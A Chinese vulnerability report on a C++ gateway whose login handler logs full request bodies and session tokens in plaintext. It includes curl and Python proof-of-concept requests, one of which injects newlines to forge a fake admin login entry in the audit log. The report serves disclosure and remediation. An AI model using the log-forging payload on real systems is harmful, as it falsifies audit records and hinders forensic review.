# VULN-SEC-MAIN-006: 登录接口将完整 HTTP 请求体明文写入审计日志，可泄露敏感数据

**严重性**: Low | **CWE**: CWE-532 (日志中插入敏感信息) | **置信度**: 85/100
**位置**: `src/main.cpp:40-43` @ `main (POST /login lambda)`

---

## 1. 漏洞细节

在 POST `/login` 路由处理函数中，第 43 行将完整的 HTTP 请求体（`request.body`）作为 `detail` 参数传递给 `AuditLog::event()` 方法。`AuditLog::event()` 在 `include/audit_log.hpp:11-14` 中将 `detail` 参数以明文形式直接追加写入日志文件 `edge-gateway.audit.log`，未做任何过滤、脱敏或截断处理。

虽然当前代码从 URL 查询参数（query string）中提取用户名和密码（第 41-42 行），但 HTTP 客户端在实际使用中完全可能在 POST 请求体中携带敏感数据，例如：

- `application/x-www-form-urlencoded` 格式的表单凭据（`user=admin&password=secret`）
- `application/json` 格式的 JSON 凭据（`{"user":"admin","password":"secret"}`）
- 包含个人身份信息（PII）、令牌或其他机密数据的自定义载荷

这些数据将被原封不动地持久化到日志文件中。日志文件通常会被运维人员、日志聚合系统（如 ELK、Splunk）、备份系统等多个环节访问，敏感信息泄露的暴露面远大于内存中的临时数据。

此外，同一函数中第 50 行还存在类似问题：登录成功后将会话令牌（session token）明文写入日志：
```cpp
audit.event(username, "login-success", token);
```
这进一步扩大了敏感信息泄露的范围。

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 40-52)

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
  std::string username = queryValue(request, "user");       // 从 URL query 提取用户名
  std::string password = queryValue(request, "password");   // 从 URL query 提取密码
  audit.event(username, "login-attempt", request.body);     // ← 漏洞点：完整 body 写入日志

  if (!users.authenticate(username, password)) {
    return text(401, "invalid credentials\n");
  }

  std::string token = users.issueSession(username);
  audit.event(username, "login-success", token);            // ← 附带问题：会话令牌写入日志
  return text(200, "session=" + token + "\n");
});
```

**文件**: `include/audit_log.hpp` (行 11-14)

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
  out_ << std::time(nullptr) << " user=" << user
       << " action=" << action
       << " detail=" << detail << "\n";   // ← Sink：detail 明文写入日志文件
}
```

**文件**: `src/http_server.cpp` (行 65-67) — 请求体解析

```cpp
std::ostringstream body;
body << stream.rdbuf();
request.body = body.str();   // 原始请求体直接赋值，无任何清洗
```

**逐段分析**：

1. `http_server.cpp:65-67`：HTTP 请求体从网络套接字原始数据中提取后直接赋值给 `request.body`，未经任何过滤或脱敏。
2. `main.cpp:43`：`request.body` 作为第三个参数（`detail`）传递给 `audit.event()`，无任何中间处理。
3. `audit_log.hpp:12-14`：`detail` 参数通过 `<<` 运算符直接追加到日志文件输出流，无长度限制、无内容检查、无脱敏处理。

整条数据流路径上不存在任何安全控制点。

## 3. 完整攻击链路

```
[攻击者] 发送 POST /login 请求（body 中包含敏感数据）
↓ HTTP 请求通过 TCP 到达服务端
[网络接收] recv()@http_server.cpp:113
↓ 原始数据存入 buffer（4096 字节）
[请求解析] parseRequest()@http_server.cpp:42-69
↓ request.body = 原始请求体（无清洗）
[路由处理] POST /login lambda@main.cpp:40
↓ request.body 作为 detail 参数传递
[日志记录] audit.event()@audit_log.hpp:11-14
↓ out_ << detail 明文写入文件
[持久化] edge-gateway.audit.log 文件 [SINK]
```

**链路详细说明**：

1. **网络接收**（`http_server.cpp:111-113`）：服务端通过 `recv()` 从 TCP 套接字读取最多 4095 字节的原始 HTTP 数据。攻击者可在 POST 请求体中放入任意内容。

2. **请求解析**（`http_server.cpp:42-69`）：`parseRequest()` 方法解析 HTTP 请求行、头部和请求体。请求体通过 `body << stream.rdbuf()` 原封不动地提取（第 65-67 行），不包含任何内容检查或敏感信息过滤。

3. **路由处理**（`main.cpp:40-43`）：POST `/login` 处理函数在第 43 行将 `request.body` 直接传递给 `audit.event()`。此处无对 body 内容的检查、截断或脱敏。

4. **日志写入**（`audit_log.hpp:11-14`）：`event()` 方法将 `detail` 参数（即 `request.body`）通过 `<<` 运算符直接写入 `std::ofstream`，最终持久化到 `edge-gateway.audit.log` 文件。无任何过滤或脱敏逻辑。

**整条链路无分支阻断、无数据清洗、无安全控制措施，攻击者可完全控制写入日志的内容。**

## 4. 攻击场景

**攻击者画像**: 任何能够向目标服务器发送 HTTP POST 请求的远程用户（无需认证）。

**攻击向量**: 通过向 `/login` 端点发送包含敏感数据的 POST 请求，使敏感内容被记录到服务器审计日志中。攻击者也可利用此机制向日志文件注入伪造条目（日志注入/Log Forging）。

**利用难度**: 低

### 攻击步骤

1. **构造恶意请求**：攻击者构造一个 POST `/login` 请求，在请求体中包含敏感数据或精心构造的日志注入载荷。
2. **发送请求**：通过 `curl`、Python 脚本或任意 HTTP 客户端向目标服务器发送该请求。
3. **数据持久化**：服务器处理请求时，完整的请求体被原封不动地写入 `edge-gateway.audit.log` 文件。
4. **信息泄露**：当日志文件被运维人员、日志聚合系统或备份系统访问时，其中包含的敏感数据即被暴露。
5. **日志注入（附加攻击）**：攻击者可在请求体中嵌入换行符（`\n`）和伪造的日志字段，向日志中注入虚假条目，干扰安全审计和取证分析。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需能访问服务器监听的端口（默认 8080），无需特殊网络权限        |
| 认证要求   | 无需认证       | POST /login 端点本身即为登录接口，无需任何预先认证即可访问           |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，无需特殊配置即可触发                       |
| 环境依赖   | 无特殊要求     | 任何支持 C++ 编译和运行的操作系统均可受影响                          |
| 时序条件   | 无             | 每次 POST /login 请求都会触发日志记录，无竞态条件依赖                |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                           |
| -------- | ---- | ---------------------------------------------------------------------------------------------- |
| 机密性   | 中   | 请求体中可能包含凭据、令牌、PII 等敏感数据，被明文持久化到日志文件中，扩大信息泄露暴露面       |
| 完整性   | 低   | 攻击者可通过日志注入（嵌入换行符和伪造字段）篡改日志内容，干扰安全审计和取证分析               |
| 可用性   | 无   | 漏洞不影响系统正常运行和服务可用性                                                             |

**影响范围**: 局部影响。主要影响审计日志的机密性和完整性。若日志文件被集中收集或备份，泄露范围可能扩展至日志聚合平台、备份存储等下游系统。此外，第 50 行的会话令牌记录进一步扩大了泄露范围——成功登录后生成的 token 也被明文记录，攻击者若获取日志文件可直接劫持用户会话。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 验证敏感数据被记录到日志

```bash
# 发送包含敏感数据的 POST 请求
curl -X POST "http://TARGET:8080/login?user=test&password=test" \
  -d "secret_api_key=REDACTED_EXAMPLE_KEY&ssn=123-45-6789"

# 检查日志文件内容
cat edge-gateway.audit.log
# 预期输出包含：
# <timestamp> user=test action=login-attempt detail=secret_api_key=REDACTED_EXAMPLE_KEY&ssn=123-45-6789
```

### PoC 2: 日志注入攻击（Log Forging）

```bash
# 构造包含换行符和伪造日志条目的请求体
# 使用 URL 编码的换行符 %0a
curl -X POST "http://TARGET:8080/login?user=test&password=test" \
  -d $'fake_entry\n1718000000 user=admin action=login-success detail=forged-token'

# 检查日志文件
cat edge-gateway.audit.log
# 预期输出包含伪造的日志条目：
# <timestamp> user=test action=login-attempt detail=fake_entry
# 1718000000 user=admin action=login-success detail=forged-token
```

### PoC 3: Python 脚本验证

```python
#!/usr/bin/env python3
"""仅供安全测试使用：验证 CWE-532 敏感数据日志泄露漏洞"""
import socket

TARGET = "127.0.0.1"
PORT = 8080

# 构造包含敏感数据的 POST 请求
body = "credit_card=4111-1111-1111-1111&cvv=123&password=SuperSecret123"
request = (
    f"POST /login?user=victim&password=test HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"\r\n"
    f"{body}"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.sendall(request.encode())
response = sock.recv(4096).decode()
sock.close()

print(f"服务器响应:\n{response}")
print(f"\n请检查 edge-gateway.audit.log 文件，确认以下内容已被记录：")
print(f"  detail={body}")
```

**使用说明**: 在目标服务器运行状态下执行上述 PoC，然后检查服务器工作目录下的 `edge-gateway.audit.log` 文件，确认请求体内容是否被完整记录。

**预期结果**: 日志文件中出现包含完整请求体内容的 `detail=` 字段，其中包含发送的敏感数据（API 密钥、信用卡号、密码等）。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+ 或同等发行版）
- 编译器: g++ 9.0+ 或 clang++ 10.0+（支持 C++17）
- 依赖: 标准 C++ 库（无第三方依赖）
- 工具: curl（用于发送测试请求）

### 构建步骤

```bash
# 编译项目
g++ -std=c++17 -o edge-gateway \
  src/main.cpp \
  src/http_server.cpp \
  src/file_cache.cpp \
  src/diagnostics.cpp \
  src/user_store.cpp \
  -I include

# 确认编译成功
ls -la edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway 8080

# 或使用自定义端口
./edge-gateway 9090
```

无需特殊配置文件或环境变量。日志文件 `edge-gateway.audit.log` 将在服务启动目录自动创建。

### 验证步骤

1. 编译并启动 `edge-gateway` 服务
2. 确认服务正常监听（`ss -tlnp | grep 8080`）
3. 使用 PoC 1 发送包含敏感数据的 POST 请求
4. 查看 `edge-gateway.audit.log` 文件内容
5. 确认请求体中的敏感数据被完整记录在日志中
6. （可选）使用 PoC 2 验证日志注入攻击

### 预期结果

- 日志文件 `edge-gateway.audit.log` 中出现如下格式的条目：
  ```
  <unix_timestamp> user=<username> action=login-attempt detail=<完整请求体内容>
  ```
- 请求体中的所有敏感字段（密码、API 密钥、个人信息等）均以明文形式出现在日志中
- 若执行 PoC 2，日志中将出现伪造的日志条目，证明日志注入攻击可行
